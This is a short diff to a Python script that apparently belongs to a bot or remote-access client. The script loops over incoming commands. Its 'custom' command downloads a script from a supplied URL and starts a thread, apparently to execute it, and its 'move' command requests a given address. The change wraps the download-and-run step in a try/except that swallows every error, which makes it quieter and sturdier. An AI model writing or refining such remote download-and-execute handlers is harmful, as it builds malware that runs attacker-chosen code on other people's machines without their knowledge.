@@ -122,11 +122,14 @@ while True:
                     pass
 
             elif a[0].lower() == 'custom':
-                __script__ = a[1]
-                with urllib.request.urlopen(__script__) as url:
-                    __script__ = url.read()
-                    threading.Thread(target=cust).start()
-
+                try:
+                
+                    __script__ = a[1]
+                    with urllib.request.urlopen(__script__) as url:
+                        __script__ = url.read()
+                        threading.Thread(target=cust).start()
+                except:
+                    pass
             elif a[0].lower() == 'move':
                 try:
                     requests.get(a[1])
